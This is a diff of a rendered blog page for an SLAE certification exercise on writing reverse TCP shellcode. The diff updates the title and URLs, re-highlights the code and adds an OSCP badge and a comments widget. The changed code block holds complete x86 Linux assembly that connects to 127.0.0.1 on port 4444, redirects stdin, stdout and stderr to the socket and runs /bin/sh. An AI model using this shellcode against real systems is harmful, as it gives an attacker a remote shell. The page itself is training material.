@@ -3,25 +3,25 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
-  <title>Brett Lischalk | SLAE Problem 2 Reverse TCP Shellcode</title>
+  <title>Brett Lischalk | SLAE Problem 2: Reverse TCP Shellcode</title>
   <meta name="description" content="A nice walkthrough of creating a reverse shellcode from scratch">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <meta property="og:title" content="SLAE Problem 2 Reverse TCP Shellcode">
+  <meta property="og:title" content="SLAE Problem 2: Reverse TCP Shellcode">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="http://brettlischalk.com//posts/slae-problem-2-reverse-tcp-shellcode">
+  <meta property="og:url" content="http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode">
   <meta property="og:description" content="A nice walkthrough of creating a reverse shellcode from scratch">
   <meta property="og:site_name" content="Brett Lischalk">
-  <meta property="og:image" content="http://brettlischalk.com//assets/og-image.jpg">
+  <meta property="og:image" content="http://localhost:4000/assets/og-image.jpg">
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:url" content="http://brettlischalk.com//posts/slae-problem-2-reverse-tcp-shellcode">
-  <meta name="twitter:title" content="SLAE Problem 2 Reverse TCP Shellcode">
+  <meta name="twitter:url" content="http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode">
+  <meta name="twitter:title" content="SLAE Problem 2: Reverse TCP Shellcode">
   <meta name="twitter:description" content="A nice walkthrough of creating a reverse shellcode from scratch">
-  <meta name="twitter:image" content="http://brettlischalk.com//assets/og-image.jpg">
+  <meta name="twitter:image" content="http://localhost:4000/assets/og-image.jpg">
 
   <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
-  <link href="http://brettlischalk.com//feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
+  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
 
   
     <link type="text/css" rel="stylesheet" href="/assets/dark.css">
@@ -86,7 +86,7 @@
 
         <article class="article reveal">
           <header class="article-header">
-            <h1>SLAE Problem 2 Reverse TCP Shellcode</h1>
+            <h1>SLAE Problem 2: Reverse TCP Shellcode</h1>
             <p>A nice walkthrough of creating a reverse shellcode from scratch</p>
             <div class="article-list-footer">
               <span class="article-list-date">
@@ -96,7 +96,7 @@
               <span class="article-list-minutes">
                 
                 
-                  6 minute read
+                  7 minute read
                 
               </span>
               <span class="article-list-divider">-</span>
@@ -245,117 +245,132 @@ connect instead of bind, remove unnecessary system calls, and make
 sure that we redirect stdin,stdout,and stderror before making our
 connection we should be in good shape. Lets give that a go:</p>
 
-<figure class="highlight"><pre><code class="language-assembly" data-lang="assembly">    global _start
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">    <span class="kr">global</span> <span class="n">_start</span>
     
-    section .text
-      _start:
-        ;; Create a socket
-        ;; int socketcall(int call, unsigned long *args);
-        ;; int socket(int domain, int type, int protocol);
-        ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
-        ;; Use socketcall to call down to socket
-        xor eax, eax
-        mov al, 0x66 ; socketcall syscall
-        xor ebx, ebx
-        mov bl, 0x1 ; sys_socket syscall number
+    <span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+      <span class="n">_start</span><span class="o">:</span>
+        <span class="c">;; Create a socket</span>
+        <span class="c">;; int socketcall(int call, unsigned long *args);</span>
+        <span class="c">;; int socket(int domain, int type, int protocol);</span>
+        <span class="c">;; #define SYS_SOCKET 1   /* sys_socket(2)    */</span>
+        <span class="c">;; Use socketcall to call down to socket</span>
+        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
+        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c">; sys_socket syscall number</span>
     
-        ;; Put the socket() args on the stack
-        xor ecx, ecx
-        push ecx ; INADDR_ANY Accept on any interface 0x00000000
-        push ebx ; SOCK_STREAM is the type of socket 1
+        <span class="c">;; Put the socket() args on the stack</span>
+        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; INADDR_ANY Accept on any interface 0x00000000</span>
+        <span class="k">push</span> <span class="n">ebx</span> <span class="c">; SOCK_STREAM is the type of socket 1</span>
     
-        push 0x2 ; protocol af_inet is the ip protocol 2
+        <span class="k">push</span> <span class="mh">0x2</span> <span class="c">; protocol af_inet is the ip protocol 2</span>
     
-        mov ecx, esp ; save pointer to args for the socket() call
-        int 0x80 ; call sys_socket
+        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; save pointer to args for the socket() call</span>
+        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_socket</span>
     
-        ; save the returned listening socket file descriptor
-        xor edi, edi
-        mov edi, eax
-    
-    
-        ;; Connect on the socket
-        xor eax, eax
-        mov al, 0x66 ; socketcall syscall
-    
-        ;; Start building the sockaddr_in structure
-        ;; Since the structure is laid out as:
-        ;; sin_family, sin_port, sin_addr
-        ;; we need to push the values onto the stack
-        ;; in reverse order
-        ;; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-        ;; sin_addr= inet_addr("127.0.0.1) = 0x0100007f
-        ;; loop back addr is 127.0.0.1
-        ;; this translates to 0x0100007f
-        ;; we don't want to have null bytes 0x00
-        ;; so we add 0x01010101 to our address
-        ;; move it into a register
-        ;; and then subtract
-        xor ecx, ecx
-        mov ecx, 0x02010180 ; 0x0100007f
-        sub ecx, 0x01010101
-        push ecx ; inet_addr("127.0.0.1) = 0x0100007f
-        ;;push 0x0101017f ; inet_addr("127.1.1.1")
-    
-        ;; 4444 is 0x115c in little endian. Network byte order is
-        ;; Big endian so we swap the byte ordering
-        push word 0x5c11 ; sin_port=4444 (network byte order)
-        ;; bl is sys_connect syscallnumber 0x3
-        ;; prior to the next instruction
-        ;; subtract one to bring it to 0x2
-        ;; which is what AF_INET represents
-        inc ebx
-        push word bx     ; sin_family=AF_INET (0x2)
-        mov ecx, esp     ; move pointer to sockaddr_in structure
+        <span class="c">; save the returned listening socket file descriptor</span>
+        <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
+        <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
     
     
-        ;; In the initial code we use sizeof to derive the addrlen
-        ;; If we print the results of that we get 0x10 which is 16 bytes
-        push 0x10 ;addrlen=16
-        push ecx  ;struct sockaddr pointer
-        push edi  ;sockfd
-        mov ecx, esp ;save pointer to bind() args
-        inc ebx
-        int 0x80 ; call sys_connect
+        <span class="c">;; Connect on the socket</span>
+        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
     
-        ;; call dup2 for stdin, stdout, and stderr in a loop
-        xor ecx, ecx
-        mov cl, 0x2 ;loop counter
-        xor eax, eax
-      dup2:
-        mov al, 0x3f ;dup2
-        int 0x80
-        dec ecx
-        jns dup2
+        <span class="c">;; Start building the sockaddr_in structure</span>
+        <span class="c">;; Since the structure is laid out as:</span>
+        <span class="c">;; sin_family, sin_port, sin_addr</span>
+        <span class="c">;; we need to push the values onto the stack</span>
+        <span class="c">;; in reverse order</span>
+        <span class="c">;; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
+        <span class="c">;; sin_addr= inet_addr("127.0.0.1) = 0x0100007f</span>
+        <span class="c">;; loop back addr is 127.0.0.1</span>
+        <span class="c">;; this translates to 0x0100007f</span>
+        <span class="c">;; we don't want to have null bytes 0x00</span>
+        <span class="c">;; so we add 0x01010101 to our address</span>
+        <span class="c">;; move it into a register</span>
+        <span class="c">;; and then subtract</span>
+        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x02010180</span> <span class="c">; 0x0100007f</span>
+        <span class="k">sub</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x01010101</span>
+        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; inet_addr("127.0.0.1) = 0x0100007f</span>
+        <span class="c">;;push 0x0101017f ; inet_addr("127.1.1.1")</span>
     
-        ;; Call execve
-        xor eax, eax
-        mov al, 0xb ;execve
-        xor ebx, ebx
-        push ebx
-        push 0x68732f2f ;"sh//"
-        push 0x6e69622f ;"nib/"
-        mov ebx, esp
-        xor ecx, ecx
-        xor edx, edx
-        int 0x80</code></pre></figure>
+        <span class="c">;; 4444 is 0x115c in little endian. Network byte order is</span>
+        <span class="c">;; Big endian so we swap the byte ordering</span>
+        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x5c11</span> <span class="c">; sin_port=4444 (network byte order)</span>
+        <span class="c">;; bl is sys_connect syscallnumber 0x3</span>
+        <span class="c">;; prior to the next instruction</span>
+        <span class="c">;; subtract one to bring it to 0x2</span>
+        <span class="c">;; which is what AF_INET represents</span>
+        <span class="k">inc</span> <span class="n">ebx</span>
+        <span class="k">push</span> <span class="n">word</span> <span class="n">bx</span>     <span class="c">; sin_family=AF_INET (0x2)</span>
+        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>     <span class="c">; move pointer to sockaddr_in structure</span>
+    
+    
+        <span class="c">;; In the initial code we use sizeof to derive the addrlen</span>
+        <span class="c">;; If we print the results of that we get 0x10 which is 16 bytes</span>
+        <span class="k">push</span> <span class="mh">0x10</span> <span class="c">;addrlen=16</span>
+        <span class="k">push</span> <span class="n">ecx</span>  <span class="c">;struct sockaddr pointer</span>
+        <span class="k">push</span> <span class="n">edi</span>  <span class="c">;sockfd</span>
+        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;save pointer to bind() args</span>
+        <span class="k">inc</span> <span class="n">ebx</span>
+        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_connect</span>
+    
+        <span class="c">;; call dup2 for stdin, stdout, and stderr in a loop</span>
+        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+        <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">;loop counter</span>
+        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+      <span class="n">dup2</span><span class="o">:</span>
+        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span> <span class="c">;dup2</span>
+        <span class="k">int</span> <span class="mh">0x80</span>
+        <span class="k">dec</span> <span class="n">ecx</span>
+        <span class="k">jns</span> <span class="n">dup2</span>
+    
+        <span class="c">;; Call execve</span>
+        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
+        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span> <span class="c">;execve</span>
+        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
+        <span class="k">push</span> <span class="n">ebx</span>
+        <span class="k">push</span> <span class="mh">0x68732f2f</span> <span class="c">;"sh//"</span>
+        <span class="k">push</span> <span class="mh">0x6e69622f</span> <span class="c">;"nib/"</span>
+        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
+        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
+        <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
+        <span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>
 
 
           </div>
 
           <div class="article-share">
             
-            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 2 Reverse TCP Shellcode - http://brettlischalk.com//posts/slae-problem-2-reverse-tcp-shellcode by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
+            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 2: Reverse TCP Shellcode - http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
               <span class="icon icon-social-twitter"></span>
             </a>
-            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://brettlischalk.com//posts/slae-problem-2-reverse-tcp-shellcode', 'newwindow', 'width=500, height=500'); return false;">
+            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode', 'newwindow', 'width=500, height=500'); return false;">
               <span class="icon icon-social-facebook"></span>
             </a>
-            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://brettlischalk.com//posts/slae-problem-2-reverse-tcp-shellcode', 'newwindow', 'width=550, height=400'); return false;">
+            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/posts/slae-problem-2-reverse-tcp-shellcode', 'newwindow', 'width=550, height=400'); return false;">
               <span class="icon icon-social-googleplus"></span>
             </a>
           </div>
 
+          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png"" />
+          </a>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script>
+              (function() {
+                  var d = document, s = d.createElement('script');
+                  s.src = '//blischalkblog.disqus.com/embed.js';
+                  s.setAttribute('data-timestamp', +new Date());
+                  (d.head || d.body).appendChild(s);
+              })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
           
         </article>
         <footer class="footer reveal">
